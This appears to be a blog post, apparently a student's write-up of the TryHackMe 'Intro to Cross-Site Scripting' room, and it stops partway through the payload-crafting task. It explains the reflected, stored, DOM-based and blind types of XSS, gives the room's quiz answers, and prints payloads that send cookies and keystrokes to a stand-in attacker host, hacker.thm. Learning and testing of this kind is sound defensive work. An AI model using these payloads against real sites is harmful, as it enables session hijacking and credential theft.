@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>TryHackMe Intro to Cross-Site Scripting | My Cybersecurity Blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="TryHackMe Intro to Cross-Site Scripting: Mastering Web Application Security
+Learn XSS fundamentals and discover how to identify and exploit client-side vulnerabilities
+
+Introduction
+Ever wondered how attackers can execute malicious code in someone else&rsquo;s browser through a website? Or how cybersecurity professionals identify and exploit Cross-Site Scripting (XSS) vulnerabilities? I recently completed TryHackMe&rsquo;s &ldquo;Intro to Cross-Site Scripting&rdquo; room, and I&rsquo;m excited to share my journey into one of the most prevalent web application security vulnerabilities.">
+    <meta name="generator" content="Hugo 0.148.0">
+    
+    
+    
+      <meta name="robots" content="noindex, nofollow">
+    
+    
+
+    
+<link rel="stylesheet" href="/ananke/css/main.min.css" >
+
+
+
+
+    
+
+
+    
+      
+
+    
+
+    
+
+    
+      <link rel="canonical" href="http://localhost:1313/posts/tryhackme-crosssitescripting/">
+    
+
+    <meta property="og:url" content="http://localhost:1313/posts/tryhackme-crosssitescripting/">
+  <meta property="og:site_name" content="My Cybersecurity Blog">
+  <meta property="og:title" content="TryHackMe Intro to Cross-Site Scripting">
+  <meta property="og:description" content="TryHackMe Intro to Cross-Site Scripting: Mastering Web Application Security Learn XSS fundamentals and discover how to identify and exploit client-side vulnerabilities
+Introduction Ever wondered how attackers can execute malicious code in someone else’s browser through a website? Or how cybersecurity professionals identify and exploit Cross-Site Scripting (XSS) vulnerabilities? I recently completed TryHackMe’s “Intro to Cross-Site Scripting” room, and I’m excited to share my journey into one of the most prevalent web application security vulnerabilities.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-14T17:48:13-07:00">
+    <meta property="article:modified_time" content="2025-07-14T17:48:13-07:00">
+
+  <meta itemprop="name" content="TryHackMe Intro to Cross-Site Scripting">
+  <meta itemprop="description" content="TryHackMe Intro to Cross-Site Scripting: Mastering Web Application Security Learn XSS fundamentals and discover how to identify and exploit client-side vulnerabilities
+Introduction Ever wondered how attackers can execute malicious code in someone else’s browser through a website? Or how cybersecurity professionals identify and exploit Cross-Site Scripting (XSS) vulnerabilities? I recently completed TryHackMe’s “Intro to Cross-Site Scripting” room, and I’m excited to share my journey into one of the most prevalent web application security vulnerabilities.">
+  <meta itemprop="datePublished" content="2025-07-14T17:48:13-07:00">
+  <meta itemprop="dateModified" content="2025-07-14T17:48:13-07:00">
+  <meta itemprop="wordCount" content="3972">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TryHackMe Intro to Cross-Site Scripting">
+  <meta name="twitter:description" content="TryHackMe Intro to Cross-Site Scripting: Mastering Web Application Security Learn XSS fundamentals and discover how to identify and exploit client-side vulnerabilities
+Introduction Ever wondered how attackers can execute malicious code in someone else’s browser through a website? Or how cybersecurity professionals identify and exploit Cross-Site Scripting (XSS) vulnerabilities? I recently completed TryHackMe’s “Intro to Cross-Site Scripting” room, and I’m excited to share my journey into one of the most prevalent web application security vulnerabilities.">
+
+	
+  </head><body class="ma0 avenir bg-near-white development">
+
+    
+   
+  
+
+  <header>
+    <div class="bg-black">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l center items-center justify-between">
+    <a href="/" class="f3 fw2 hover-white white-90 dib no-underline">
+      
+        My Cybersecurity Blog
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+        <ul class="pl0 mr3">
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white white-90 no-underline" href="/" title="Home page">
+              Home
+            </a>
+          </li>
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white white-90 no-underline" href="/about/" title="About page">
+              About
+            </a>
+          </li>
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white white-90 no-underline" href="/projects/" title="Projects page">
+              Projects
+            </a>
+          </li>
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white white-90 no-underline" href="/contact/" title="Contact page">
+              Contact
+            </a>
+          </li>
+          
+        </ul>
+      
+      <div class="ananke-socials"></div>
+
+    </div>
+  </div>
+</nav>
+
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  
+  <article class="flex-l mw8 center ph3 flex-wrap justify-between">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked ttu">
+          
+        Posts
+      </aside><div id="sharing" class="mt3 ananke-socials"></div>
+<h1 class="f1 athelas mt3 mb1">TryHackMe Intro to Cross-Site Scripting</h1>
+      
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2025-07-14T17:48:13-07:00">July 14, 2025</time>
+      
+
+      
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><h1 id="tryhackme-intro-to-cross-site-scripting-mastering-web-application-security">TryHackMe Intro to Cross-Site Scripting: Mastering Web Application Security</h1>
+<p><em>Learn XSS fundamentals and discover how to identify and exploit client-side vulnerabilities</em></p>
+<hr>
+<h2 id="introduction">Introduction</h2>
+<p>Ever wondered how attackers can execute malicious code in someone else&rsquo;s browser through a website? Or how cybersecurity professionals identify and exploit Cross-Site Scripting (XSS) vulnerabilities? I recently completed TryHackMe&rsquo;s &ldquo;Intro to Cross-Site Scripting&rdquo; room, and I&rsquo;m excited to share my journey into one of the most prevalent web application security vulnerabilities.</p>
+<p>This comprehensive guide will walk you through everything I learned about XSS types, payload creation, filter evasion techniques, and practical exploitation scenarios that every cybersecurity professional needs to understand.</p>
+<p><strong>What you&rsquo;ll learn from this post:</strong></p>
+<ul>
+<li>Understanding different types of XSS vulnerabilities</li>
+<li>Creating and crafting effective XSS payloads</li>
+<li>Techniques for bypassing input filters and security measures</li>
+<li>Real-world exploitation scenarios and impact assessment</li>
+<li>Practical hands-on experience with XSS identification and exploitation</li>
+</ul>
+<hr>
+<h2 id="room-information">Room Information</h2>
+<ul>
+<li><strong>Room Name</strong>: Intro to Cross-Site Scripting</li>
+<li><strong>Difficulty</strong>: Easy (Perfect for beginners!)</li>
+<li><strong>Platform</strong>: TryHackMe</li>
+<li><strong>Room URL</strong>: <a href="https://tryhackme.com/room/xss">https://tryhackme.com/room/xss</a></li>
+<li><strong>Estimated Time</strong>: 3-4 hours</li>
+<li><strong>Skills Required</strong>: Basic JavaScript knowledge, understanding of client-server requests</li>
+<li><strong>Skills Gained</strong>: XSS identification, payload creation, filter evasion, web application security testing</li>
+</ul>
+<hr>
+<h2 id="learning-objectives">Learning Objectives</h2>
+<p>This room covers essential XSS concepts that form the foundation for web application security testing:</p>
+<ul>
+<li>Understanding Cross-Site Scripting and its impact on web security</li>
+<li>Learning different types of XSS vulnerabilities (Reflected, Stored, DOM-based, Blind)</li>
+<li>Mastering payload creation and modification techniques</li>
+<li>Developing skills in filter evasion and bypass methods</li>
+<li>Building practical experience with real-world XSS scenarios</li>
+<li>Understanding the business impact and prevention strategies</li>
+</ul>
+<hr>
+<h2 id="foundation-knowledge-understanding-cross-site-scripting">Foundation Knowledge: Understanding Cross-Site Scripting</h2>
+<h3 id="what-is-cross-site-scripting-xss">What is Cross-Site Scripting (XSS)?</h3>
+<p>Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.</p>
+<h3 id="why-xss-matters">Why XSS Matters</h3>
+<p>XSS vulnerabilities are extremely common and can be highly lucrative for security researchers. Some notable XSS bounty rewards include:</p>
+<ul>
+<li><strong>$7,500</strong> for XSS found in Steam chat</li>
+<li><strong>$2,500</strong> for XSS in HackerOne</li>
+<li>Multiple reports of XSS in major applications like Shopify and Infogram</li>
+</ul>
+<h3 id="prerequisites-for-understanding-xss">Prerequisites for Understanding XSS</h3>
+<ul>
+<li><strong>JavaScript Basics</strong>: Since XSS is based on JavaScript execution</li>
+<li><strong>Client-Server Communication</strong>: Understanding HTTP requests and responses</li>
+<li><strong>Web Application Architecture</strong>: Basic knowledge of how web applications work</li>
+</ul>
+<hr>
+<h2 id="task-1-room-brief---setting-the-foundation">Task 1: Room Brief - Setting the Foundation</h2>
+<h3 id="understanding-the-xss-landscape">Understanding the XSS Landscape</h3>
+<p>Cross-Site Scripting represents one of the most significant threats to modern web applications. Unlike server-side vulnerabilities, XSS attacks target the client-side, exploiting the trust that users have in legitimate websites.</p>
+<h3 id="the-core-concept">The Core Concept</h3>
+<p>XSS attacks work by injecting malicious scripts into trusted websites. When other users visit these compromised pages, the malicious scripts execute in their browsers, potentially compromising their data, sessions, and privacy.</p>
+<h3 id="task-challenge">Task Challenge</h3>
+<p><strong>Question</strong>: What does XSS stand for?</p>
+<p><strong>Answer</strong>: <strong>Cross-Site Scripting</strong></p>
+<p><strong>Explanation</strong>: The acronym XSS is used instead of CSS to avoid confusion with Cascading Style Sheets.</p>
+<p><strong>Key Insight</strong>: Understanding that XSS is fundamentally about executing unauthorized JavaScript in a user&rsquo;s browser context is crucial for both offensive and defensive security.</p>
+<hr>
+<h2 id="task-2-xss-payloads---the-heart-of-the-attack">Task 2: XSS Payloads - The Heart of the Attack</h2>
+<h3 id="understanding-payloads">Understanding Payloads</h3>
+<p>In XSS, the payload is the JavaScript code we wish to be executed on the target&rsquo;s computer. Every XSS payload consists of two components:</p>
+<ol>
+<li><strong>The Intention</strong>: What you want the JavaScript to accomplish</li>
+<li><strong>The Modification</strong>: Changes needed to make the code execute in specific scenarios</li>
+</ol>
+<h3 id="common-xss-payload-types">Common XSS Payload Types</h3>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<p>The simplest payload demonstrates XSS capability by triggering an alert box:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;XSS&#39;</span>);<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><p><strong>Purpose</strong>: Demonstrates that JavaScript execution is possible
+<strong>Impact</strong>: Confirms vulnerability exists for further exploitation</p>
+<h3 id="session-stealing">Session Stealing</h3>
+<p>Extracts user session cookies for account hijacking:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://hacker.thm/steal?cookie=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">btoa</span>(document.<span style="color:#a6e22e">cookie</span>));<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><p><strong>How it works</strong>:</p>
+<ul>
+<li><code>document.cookie</code> accesses the victim&rsquo;s cookies</li>
+<li><code>btoa()</code> base64 encodes the cookies for safe transmission</li>
+<li><code>fetch()</code> sends the encoded cookies to an attacker-controlled server</li>
+</ul>
+<h3 id="key-logger">Key Logger</h3>
+<p>Captures all keystrokes from the compromised webpage:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>document.<span style="color:#a6e22e">onkeypress</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>) { <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://hacker.thm/log?key=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">key</span>) );}<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><p><strong>Dangerous scenarios</strong>:</p>
+<ul>
+<li>Login forms with username/password fields</li>
+<li>Credit card information entry</li>
+<li>Personal information collection</li>
+</ul>
+<h3 id="business-logic-exploitation">Business Logic Exploitation</h3>
+<p>Targets specific application functions for unauthorized actions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">changeEmail</span>(<span style="color:#e6db74">&#39;attacker@hacker.thm&#39;</span>);<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><p><strong>Example attack chain</strong>:</p>
+<ol>
+<li>Change victim&rsquo;s email address</li>
+<li>Initiate password reset</li>
+<li>Gain full account control</li>
+</ol>
+<h3 id="task-challenges">Task Challenges</h3>
+<p><strong>Challenge 1: Document Properties</strong>
+<em>Question</em>: Which document property could contain the user&rsquo;s session token?</p>
+<p><em>Answer</em>: <strong>cookie</strong></p>
+<p><em>Explanation</em>: The <code>document.cookie</code> property contains session tokens and authentication cookies.</p>
+<p><strong>Challenge 2: Proof of Concept</strong>
+<em>Question</em>: Which JavaScript method is often used as a Proof Of Concept?</p>
+<p><em>Answer</em>: <strong>alert</strong></p>
+<p><em>Explanation</em>: The <code>alert()</code> method is commonly used to demonstrate XSS vulnerabilities with visible confirmation.</p>
+<hr>
+<h2 id="task-3-reflected-xss---immediate-execution">Task 3: Reflected XSS - Immediate Execution</h2>
+<h3 id="understanding-reflected-xss">Understanding Reflected XSS</h3>
+<p>Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation. The malicious script is &ldquo;reflected&rdquo; back to the user immediately.</p>
+<h3 id="how-reflected-xss-works">How Reflected XSS Works</h3>
+<p><strong>Example Scenario:</strong>
+A website displays error messages based on a URL parameter:</p>
+<pre tabindex="0"><code>https://website.thm/search?error=Invalid search term
+</code></pre><p>If the application doesn&rsquo;t validate the <code>error</code> parameter, an attacker can inject:</p>
+<pre tabindex="0"><code>https://website.thm/search?error=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
+</code></pre><h3 id="attack-vector-demonstration">Attack Vector Demonstration</h3>
+<p><strong>Normal Request:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;error&#34;</span>&gt;Invalid search term&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span></code></pre></div><p><strong>Malicious Request:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;error&#34;</span>&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;XSS&#39;</span>)&lt;/<span style="color:#f92672">script</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span></code></pre></div><h3 id="potential-impact">Potential Impact</h3>
+<p><strong>Attack Scenarios:</strong></p>
+<ul>
+<li>Sending malicious links to victims via email or social media</li>
+<li>Embedding malicious iframes on attacker-controlled websites</li>
+<li>Stealing session cookies when victims click crafted links</li>
+<li>Redirecting users to phishing sites</li>
+</ul>
+<h3 id="testing-for-reflected-xss">Testing for Reflected XSS</h3>
+<p><strong>Common Entry Points:</strong></p>
+<ul>
+<li>URL query string parameters</li>
+<li>URL file path components</li>
+<li>HTTP headers (less common but possible)</li>
+<li>Form data in POST requests</li>
+</ul>
+<p><strong>Testing Methodology:</strong></p>
+<ol>
+<li>Identify all input points that reflect data back to the page</li>
+<li>Test each point with basic XSS payloads</li>
+<li>Analyze how the input is reflected in the page source</li>
+<li>Modify payloads based on the reflection context</li>
+</ol>
+<h3 id="task-challenge-1">Task Challenge</h3>
+<p><strong>Question</strong>: Where in a URL is a good place to test for reflected XSS?</p>
+<p><strong>Answer</strong>: <strong>Parameters</strong> (or <strong>Query String</strong>)</p>
+<p><strong>Explanation</strong>: URL parameters are the most common place where user input gets reflected back to the page without proper validation.</p>
+<hr>
+<h2 id="task-4-stored-xss---persistent-threats">Task 4: Stored XSS - Persistent Threats</h2>
+<h3 id="understanding-stored-xss">Understanding Stored XSS</h3>
+<p>Stored XSS occurs when the XSS payload is stored in the web application (typically in a database) and then executed when other users visit the affected page. This makes it more dangerous than reflected XSS because it affects multiple users persistently.</p>
+<h3 id="how-stored-xss-works">How Stored XSS Works</h3>
+<p><strong>Example Scenario:</strong>
+A blog website allows users to post comments without properly validating the content:</p>
+<p><strong>Attacker posts comment:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Great article! &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://hacker.thm/steal?cookie=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">btoa</span>(document.<span style="color:#a6e22e">cookie</span>));&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p><strong>Result</strong>: Every user who views the blog post will have their cookies stolen.</p>
+<h3 id="attack-flow-visualization">Attack Flow Visualization</h3>
+<ol>
+<li><strong>Attacker Input</strong>: Malicious script submitted through comment form</li>
+<li><strong>Storage</strong>: Application stores the unfiltered script in the database</li>
+<li><strong>Victim Access</strong>: Legitimate users visit the page</li>
+<li><strong>Execution</strong>: Browser executes the stored malicious script</li>
+<li><strong>Impact</strong>: Victim&rsquo;s data is compromised</li>
+</ol>
+<h3 id="potential-impact-1">Potential Impact</h3>
+<p><strong>Widespread Consequences:</strong></p>
+<ul>
+<li><strong>Mass User Compromise</strong>: Every visitor to the affected page is potentially compromised</li>
+<li><strong>Session Hijacking</strong>: Stolen cookies allow account takeover</li>
+<li><strong>Data Theft</strong>: Access to sensitive user information</li>
+<li><strong>Malware Distribution</strong>: Redirecting users to malicious websites</li>
+<li><strong>Defacement</strong>: Altering website content for all users</li>
+</ul>
+<h3 id="testing-for-stored-xss">Testing for Stored XSS</h3>
+<p><strong>Common Storage Points:</strong></p>
+<ul>
+<li>Blog comments and forum posts</li>
+<li>User profile information (bio, description fields)</li>
+<li>Product reviews and ratings</li>
+<li>Message boards and chat systems</li>
+<li>File upload functionality with metadata</li>
+</ul>
+<p><strong>Testing Strategy:</strong></p>
+<ol>
+<li>Identify areas where user input is stored and displayed</li>
+<li>Submit test payloads through all input mechanisms</li>
+<li>Check if payloads execute when the stored data is viewed</li>
+<li>Test different user privilege levels to understand scope</li>
+</ol>
+<p><strong>Client-Side Bypass Techniques:</strong>
+Sometimes developers rely on client-side validation, which can be bypassed by:</p>
+<ul>
+<li>Intercepting requests with Burp Suite or similar tools</li>
+<li>Manually crafting HTTP requests</li>
+<li>Modifying form data before submission</li>
+</ul>
+<h3 id="task-challenge-2">Task Challenge</h3>
+<p><strong>Question</strong>: How are stored XSS payloads usually stored on a website?</p>
+<p><strong>Answer</strong>: <strong>Database</strong></p>
+<p><strong>Explanation</strong>: Stored XSS payloads are typically saved in the application&rsquo;s database and retrieved when users access the affected pages.</p>
+<hr>
+<h2 id="task-5-dom-based-xss---client-side-exploitation">Task 5: DOM-Based XSS - Client-Side Exploitation</h2>
+<h3 id="understanding-the-dom">Understanding the DOM</h3>
+<p>The <strong>D</strong>ocument <strong>O</strong>bject <strong>M</strong>odel (DOM) is a programming interface for HTML and XML documents. It represents the page structure so that programs can dynamically change the document structure, style, and content.</p>
+<h3 id="what-is-dom-based-xss">What is DOM-Based XSS?</h3>
+<p>DOM-Based XSS occurs when JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. The vulnerability exists in client-side scripts that process user input unsafely.</p>
+<h3 id="how-dom-based-xss-works">How DOM-Based XSS Works</h3>
+<p><strong>Example Scenario:</strong>
+Website JavaScript reads from <code>window.location.hash</code> and writes content to the page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable code
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">userInput</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;content&#39;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">userInput</span>;
+</span></span></code></pre></div><p><strong>Attack URL:</strong></p>
+<pre tabindex="0"><code>https://website.thm/page#&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
+</code></pre><p><strong>Execution Flow:</strong></p>
+<ol>
+<li>User visits the malicious URL</li>
+<li>JavaScript extracts content after the # symbol</li>
+<li>Content is directly inserted into the DOM</li>
+<li>Browser executes the injected script</li>
+</ol>
+<h3 id="common-dom-xss-sources">Common DOM XSS Sources</h3>
+<p><strong>Dangerous JavaScript Methods:</strong></p>
+<ul>
+<li><code>document.write()</code></li>
+<li><code>element.innerHTML</code></li>
+<li><code>element.outerHTML</code></li>
+<li><code>eval()</code></li>
+<li><code>setTimeout()</code> and <code>setInterval()</code> with string arguments</li>
+</ul>
+<p><strong>User-Controllable Sources:</strong></p>
+<ul>
+<li><code>window.location.hash</code></li>
+<li><code>window.location.search</code></li>
+<li><code>document.referrer</code></li>
+<li><code>window.name</code></li>
+<li><code>localStorage</code> and <code>sessionStorage</code> data</li>
+</ul>
+<h3 id="testing-for-dom-based-xss">Testing for DOM-Based XSS</h3>
+<p><strong>Analysis Requirements:</strong></p>
+<ul>
+<li><strong>Source Code Review</strong>: Examining JavaScript for unsafe data handling</li>
+<li><strong>Dynamic Analysis</strong>: Testing how user input flows through the application</li>
+<li><strong>Browser Developer Tools</strong>: Monitoring DOM changes and JavaScript execution</li>
+</ul>
+<p><strong>Testing Methodology:</strong></p>
+<ol>
+<li>Identify JavaScript code that processes user-controllable data</li>
+<li>Trace data flow from source to sink</li>
+<li>Test with various payloads to confirm execution</li>
+<li>Analyze the execution context for payload modification needs</li>
+</ol>
+<h3 id="potential-impact-2">Potential Impact</h3>
+<p><strong>Attack Scenarios:</strong></p>
+<ul>
+<li><strong>Crafted Links</strong>: Victims clicking malicious URLs</li>
+<li><strong>Content Manipulation</strong>: Altering page content dynamically</li>
+<li><strong>Session Theft</strong>: Stealing cookies and authentication tokens</li>
+<li><strong>Phishing</strong>: Creating fake login forms within legitimate sites</li>
+</ul>
+<h3 id="task-challenge-3">Task Challenge</h3>
+<p><strong>Question</strong>: What unsafe JavaScript method is good to look for in source code?</p>
+<p><strong>Answer</strong>: <strong>eval</strong></p>
+<p><strong>Explanation</strong>: The <code>eval()</code> method executes JavaScript code represented as a string, making it extremely dangerous when processing user input.</p>
+<hr>
+<h2 id="task-6-blind-xss---hidden-exploitation">Task 6: Blind XSS - Hidden Exploitation</h2>
+<h3 id="understanding-blind-xss">Understanding Blind XSS</h3>
+<p>Blind XSS is similar to stored XSS, but with a crucial difference: you cannot see the payload working or test it against yourself first. The payload gets stored and executed in areas only accessible to other users (typically staff or administrators).</p>
+<h3 id="how-blind-xss-works">How Blind XSS Works</h3>
+<p><strong>Example Scenario:</strong>
+A website has a contact form where messages are sent to staff members:</p>
+<ol>
+<li><strong>User Input</strong>: Attacker submits malicious payload through contact form</li>
+<li><strong>Storage</strong>: Message is stored in staff support system</li>
+<li><strong>Staff Access</strong>: Staff member views the message in private admin portal</li>
+<li><strong>Execution</strong>: Malicious script executes in staff member&rsquo;s browser</li>
+<li><strong>Compromise</strong>: Attacker gains access to admin session/data</li>
+</ol>
+<h3 id="attack-flow-visualization-1">Attack Flow Visualization</h3>
+<pre tabindex="0"><code>Attacker → Contact Form → Database → Staff Portal → Script Execution → Data Exfiltration
+</code></pre><h3 id="potential-impact-3">Potential Impact</h3>
+<p><strong>High-Value Targets:</strong></p>
+<ul>
+<li><strong>Administrative Access</strong>: Staff members often have elevated privileges</li>
+<li><strong>Sensitive Data</strong>: Admin portals may contain customer information</li>
+<li><strong>System Control</strong>: Administrative accounts may have system management capabilities</li>
+<li><strong>Lateral Movement</strong>: Compromised admin accounts enable further attacks</li>
+</ul>
+<p><strong>Exploitation Results:</strong></p>
+<ul>
+<li>Staff portal URL disclosure</li>
+<li>Administrative session hijacking</li>
+<li>Access to customer data and internal systems</li>
+<li>Privilege escalation within the organization</li>
+</ul>
+<h3 id="testing-for-blind-xss">Testing for Blind XSS</h3>
+<p><strong>Key Requirements:</strong></p>
+<ul>
+<li><strong>Callback Mechanism</strong>: Payload must &ldquo;phone home&rdquo; to confirm execution</li>
+<li><strong>Patience</strong>: May need to wait for staff to view the submitted content</li>
+<li><strong>Comprehensive Payloads</strong>: Must work across different contexts and browsers</li>
+</ul>
+<p><strong>Testing Strategy:</strong></p>
+<ol>
+<li>Identify input points that likely reach staff/admin users</li>
+<li>Submit payloads with callback mechanisms</li>
+<li>Monitor for incoming requests indicating execution</li>
+<li>Analyze received data for valuable information</li>
+</ol>
+<h3 id="blind-xss-tools">Blind XSS Tools</h3>
+<p><strong>XSS Hunter Express:</strong></p>
+<ul>
+<li>Popular tool for automated Blind XSS testing</li>
+<li>Automatically captures cookies, URLs, page contents</li>
+<li>Provides detailed execution reports</li>
+<li>Generates unique payloads for tracking</li>
+</ul>
+<p><strong>Custom Solutions:</strong></p>
+<ul>
+<li>Simple HTTP server to receive callbacks</li>
+<li>Webhook services for payload notifications</li>
+<li>DNS request monitoring for out-of-band detection</li>
+</ul>
+<h3 id="task-challenges-1">Task Challenges</h3>
+<p><strong>Challenge 1: Testing Tools</strong>
+<em>Question</em>: What tool can you use to test for Blind XSS?</p>
+<p><em>Answer</em>: <strong>XSS Hunter Express</strong></p>
+<p><em>Explanation</em>: XSS Hunter Express is a popular tool specifically designed for Blind XSS testing with automatic payload generation and callback handling.</p>
+<p><strong>Challenge 2: XSS Type Similarity</strong>
+<em>Question</em>: What type of XSS is very similar to Blind XSS?</p>
+<p><em>Answer</em>: <strong>Stored</strong></p>
+<p><em>Explanation</em>: Blind XSS is similar to Stored XSS because the payload is stored and executed later, but differs in that the attacker cannot directly observe the execution.</p>
+<hr>
+<h2 id="task-7-perfecting-your-payload---advanced-techniques">Task 7: Perfecting Your Payload - Advanced Techniques</h2>
+<h3 id="understanding-payload-context">Understanding Payload Context</h3>
+<p>The payload is the JavaScript code we want to execute on the target&rsquo;s browser. How your JavaScript payload gets reflected in the target website&rsquo;s code determines the specific payload modifications needed for successful execution.</p>
+<h3 id="practical-payload-development">Practical Payload Development</h3>
+<p><strong>Objective for Each Level:</strong>
+Execute the JavaScript alert function with the string &lsquo;THM&rsquo;:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;THM&#39;</span>);<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><h3 id="level-one-basic-injection">Level One: Basic Injection</h3>
+<p><strong>Scenario</strong>: User input reflected directly in HTML content</p>
+<p><strong>Input Form</strong>: Name field that displays entered value on the page</p>
+<p><strong>Payload</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;THM&#39;</span>);<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><p><strong>How it works</strong>:</p>
+<ul>
+<li>Input is placed directly into HTML content</li>
+<li>Browser interprets <code>&lt;script&gt;</code> tags and executes JavaScript</li>
+<li>No escaping or filtering prevents execution</li>
+</ul>
+<p><strong>Page Source Result</strong>:</p>
